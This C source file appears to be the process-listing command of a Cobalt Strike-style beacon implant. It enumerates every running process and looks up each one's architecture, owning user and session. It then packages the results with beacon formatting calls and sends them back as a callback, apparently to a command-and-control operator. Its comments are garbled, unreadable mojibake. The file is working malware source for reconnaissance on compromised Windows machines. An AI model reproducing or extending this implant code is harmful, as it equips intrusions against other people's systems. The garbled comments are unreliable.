#include "Process.h"
#include "Api.h"
#include "Command.h"

BOOL is_x64() {
#if defined _M_X64
	return TRUE;
#elif defined _M_IX86
	return FALSE;
#endif
}

/*
* �ж�ָ�������Ƿ��� WOW64 ���������У�Ҳ���ǣ��ǲ���һ�� 32 λ������ 64 λϵͳ�����У�
* ������� TRUE �� �ý����� 32 λ�ģ�x86���������� 64 λ Windows ��
* ������� FALSE �� Ҫô�� 64 λ����Ҫô�� 32 λϵͳ��������û�� WOW64����
*/

BOOL is_wow64(HANDLE process) {
	BOOL bIsWow64 = FALSE;

	if (!IsWow64Process(process, &bIsWow64)) {
		fprintf(stderr, "IsWow64Process failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	return bIsWow64;
}


BOOL is_x64_process(HANDLE process) {
	if (is_x64() || is_wow64(GetCurrentProcess())) {
		// ����˷�֧��ʾϵͳΪ x64
		// Ŀ������� 64 λ����TRUE
		return !is_wow64(process);
	}

	return FALSE;
}

BOOL IsProcessX64(DWORD pid) {
    BOOL isX64 = FALSE;
    /*
	* �����������־����Ϊ��Щϵͳ�������޷��򿪵�
    */
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        isX64 = is_x64_process(hProcess);
        CloseHandle(hProcess);
		return isX64;
    }
    return FALSE;
}

VOID CmdPs(unsigned char* commandBuf, size_t commandBuflen)
{
    char userSid[2048];
    memset(userSid, 0, sizeof(userSid));

    datap datap;
    BeaconDataParse(&datap, commandBuf, commandBuflen);
    int msgCallBack = BeaconDataInt(&datap);
    BeaconFormatAlloc((formatp*)&datap, 0x8000);

    if (msgCallBack > 0)
    {
        BeaconFormatInt((formatp*)&datap, msgCallBack);
    }

    DWORD pSessionId;
    DWORD th32ProcessID;
    PROCESSENTRY32 pe32;
    HANDLE hProcess;
    HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (toolHelp32Snapshot != INVALID_HANDLE_VALUE)
    {
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(toolHelp32Snapshot, &pe32))
        {
            do
            {
                th32ProcessID = pe32.th32ProcessID;
                const unsigned char* arch = "x64";
                BOOL isX64 = IsProcessX64(pe32.th32ProcessID);
                arch = isX64 ? "x64" : "x86";

                wchar_t* szExeFile = pe32.szExeFile;
                // bufferSize ���� \0
                int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, NULL, 0, NULL, NULL);
                if(bufferSize == 0)
                {
                    fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
				}
                unsigned char* szExeFileChar = (unsigned char*)malloc(bufferSize);
                if(!szExeFileChar)
                {
                    fprintf(stderr, "Memory allocation failed\n");
                    CloseHandle(toolHelp32Snapshot);
                    BeaconFormatFree((formatp*)&datap);
                    return;
				}
                // �� wchar_t* �����ַ���ת���� unsigned char* �����ַ���
                if (WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, szExeFileChar, bufferSize, NULL, NULL) == 0) {
                    fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
                }

                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, th32ProcessID);
                if (hProcess)
                {
                    if (!GetProcessUserInfo(hProcess, userSid))
                    {
                        userSid[0] = 0;
                    }
                    if (!ProcessIdToSessionId(pe32.th32ProcessID, &pSessionId))
                    {
                        // fprintf(stderr, "ProcessIdToSessionId failed with error:%lu\n", GetLastError());
                        pSessionId = -1;
                    }

                    BeaconFormatPrintf(
                        (formatp*)&datap,
                        (unsigned char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
                        szExeFileChar,
                        pe32.th32ParentProcessID,
                        pe32.th32ProcessID,
                        arch,
                        userSid,
                        pSessionId);
                    CloseHandle(hProcess);
                }
                else
                {
                    if (!ProcessIdToSessionId(pe32.th32ProcessID, &pSessionId))
                    {
						// fprintf(stderr, "ProcessIdToSessionId failed with error:%lu\n", GetLastError());
                        pSessionId = -1;
                    }
                    BeaconFormatPrintf((formatp*)&datap, (unsigned char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
                        szExeFileChar,
                        pe32.th32ParentProcessID,
                        pe32.th32ProcessID,
                        arch,
                        "",
                        pSessionId);
                }
                free(szExeFileChar);
            } while (Process32Next(toolHelp32Snapshot, &pe32));

            int msg_type;
            if (msgCallBack)
            {
                msg_type = CALLBACK_PENDING;
            }
            else
            {
                msg_type = CALLBACK_PROCESS_LIST;
            }
            int msgLen = BeaconFormatLength((formatp*)&datap);
            unsigned char* postMsg = (unsigned char*)BeaconFormatOriginal((formatp*)&datap);
            DataProcess(postMsg, msgLen, msg_type);

            CloseHandle(toolHelp32Snapshot);
            BeaconFormatFree((formatp*)&datap);
        }
        else
        {
            CloseHandle(toolHelp32Snapshot);
        }
    }
}

BOOL GetProcessUserInfo(HANDLE hProcess, unsigned char* userSid)
{
    HANDLE hToken;
    BOOL bRet = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
    if (!bRet)
    {
		fprintf(stderr, "OpenProcessToken failed with error:%lu\n", GetLastError());
        return FALSE;
    }
    bRet = GetUserSid(2048, hToken, userSid);
    CloseHandle(hToken);

    return bRet;
}

BOOL GetUserSid(size_t length, HANDLE hToken, unsigned char* result)
{
    char Name[512];
    char ReferencedDomainName[512];
    DWORD cchReferencedDomainName = 512;

    SID_NAME_USE peUse;
    memset(result, 0, length);
    memset(Name, 0, sizeof(Name));
    memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));

    DWORD ReturnLength;
    TOKEN_USER* TokenInformation;
    DWORD cchName = 512;

    // ��ȡ����� TokenInformation ��С
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &ReturnLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        fprintf(stderr, "GetTokenInformation failed with error:%lu\n", GetLastError());
        return FALSE;
    }

    TokenInformation = (TOKEN_USER*)malloc(ReturnLength);
    if (TokenInformation == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return FALSE;
    }

    // ��ȡ TokenInformation
    if (!GetTokenInformation(hToken, TokenUser, TokenInformation, ReturnLength, &ReturnLength)) {
        fprintf(stderr, "GetTokenInformation failed with error:%lu\n", GetLastError());
        free(TokenInformation);
        return FALSE;
    }

    // ���� SID ���Ҷ�Ӧ���˻���������
    if (!LookupAccountSidA(
        NULL,
        TokenInformation->User.Sid,
        Name,
        &cchName,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &peUse))
    {
        fprintf(stderr, "LookupAccountSidA failed with error:%lu\n", GetLastError());
        free(TokenInformation);
        return FALSE;
    }

    snprintf(result, length, "%s\\%s", ReferencedDomainName, Name);
	// ȷ�� '\0' ��β
    result[length - 1] = '\0';

    free(TokenInformation);
    return TRUE;
}

